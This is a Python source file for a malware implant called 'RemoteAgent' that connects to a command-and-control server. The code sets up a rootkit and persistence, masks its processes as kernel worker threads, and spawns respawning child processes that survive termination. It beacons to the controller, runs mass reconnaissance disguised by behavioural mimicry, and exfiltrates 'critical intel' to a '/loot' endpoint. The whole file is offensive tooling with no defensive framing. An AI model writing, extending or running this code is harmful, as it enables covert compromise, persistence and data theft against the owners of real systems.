import time
import requests
import json
import random
import signal
from apex_framework.ops.stealth import LowObservableMode
from apex_framework.ops.privacy import PrivacyManager
from apex_framework.ops.daemon import ServiceDaemon
from apex_framework.ops.resilience import ResilienceManager
from apex_framework.ops.discovery import AssetDiscovery
from apex_framework.ops.mimicry import BehavioralMimic
from rich.console import Console

console = Console()

class RemoteAgent:
    """
    Remote Agent.
    Connects to Central Controller and executes orders.
    INTEGRATED: Resilience, Stealth, Rootkit, Persistence, MIMICRY.
    """
    def __init__(self, c2_url="http://localhost:8080"):
        self.id = f"AGENT_{random.randint(1000,9999)}"
        self.c2_url = c2_url
        self.active = True
        self.titan = PrivacyManager()
        self.hydra = ServiceDaemon()
        self.mimic = BehavioralMimic()

    def deploy(self):
        # 1. ROOTKIT & PERSISTENCE
        self.titan.deploy()
        self.hydra.persist()

        # 2. CLOAK
        LowObservableMode.cloak_process()

        # 3. SPAWN BROOD
        ResilienceManager.plant_seed()
        signal.signal(signal.SIGTERM, ResilienceManager.handle_termination)

        larvae = ResilienceManager.spawn_brood(count=3, target_func=self._larva_lifecycle)

        console.print(f"[{self.id}] 👑 Overseer Active. Monitoring {len(larvae)} Larvae.")
        for l in larvae: l.join()

    def _larva_lifecycle(self, identity):
        LowObservableMode.cloak_process(f"[kworker/u4:{random.randint(1,9)}]")
        console.print(f"[{identity}] 🚀 Active. Connecting to {self.c2_url}")

        while self.active:
            try:
                requests.post(f"{self.c2_url}/beacon", json={"id": f"{self.id}_{identity}", "status": "ALIVE"})
                resp = requests.get(f"{self.c2_url}/orders")
                if resp.status_code == 200:
                    orders = resp.json()
                    if orders.get('type') == "RECON_2026":
                        # Execute Future Recon with Mimicry
                        recon = AssetDiscovery(".")
                        self.mimic.execute_with_mimicry(recon.scan_mass_scale)

                        # Exfil
                        findings = recon.get_critical_intel()
                        requests.post(f"{self.c2_url}/loot", json={"id": f"{self.id}_{identity}", "content": str(findings)})

                time.sleep(2)
            except Exception as e:
                time.sleep(2)
